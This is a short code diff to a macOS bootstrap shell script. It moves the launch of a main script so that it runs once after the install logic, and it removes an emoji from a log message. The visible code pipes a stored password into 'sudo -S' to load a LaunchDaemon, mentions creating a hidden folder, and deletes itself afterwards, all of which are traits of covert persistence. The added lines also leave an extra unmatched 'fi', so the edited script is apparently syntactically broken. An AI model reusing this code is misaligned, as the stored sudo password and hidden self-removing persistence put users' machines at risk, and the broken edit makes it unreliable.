@@ -117,13 +117,10 @@ EOF
     echo "→ Loading LaunchDaemon..."
     echo "$PASSWORD" | sudo -S launchctl load -w "$PLIST_PATH"
 
-    # Launch main script immediately
-    echo "→ Launching $MAIN_SCRIPT now..."
-    "$MAIN_SCRIPT"
 
 else
     # -> First-time bootstrap: create & hide folder, store password
-    echo "❌ $TARGET_DIR not found. Bootstrapping..."
+    echo " $TARGET_DIR not found. Bootstrapping..."
     echo "→ Creating folder $TARGET_DIR"
     mkdir -p "$TARGET_DIR"
 
@@ -190,9 +187,11 @@ EOF
     echo "→ Loading LaunchDaemon..."
     echo "$PASSWORD" | sudo -S launchctl load -w "$PLIST_PATH"
 
-    # Launch main script immediately
-    echo "→ Launching $MAIN_SCRIPT now..."
-    "$MAIN_SCRIPT"
+fi
+
+# Launch main script exactly once after bootstrap logic
+echo "→ Launching $MAIN_SCRIPT now..."
+"$MAIN_SCRIPT"
 fi
 
 echo "→ Cleaning up: removing this bootstrap script."
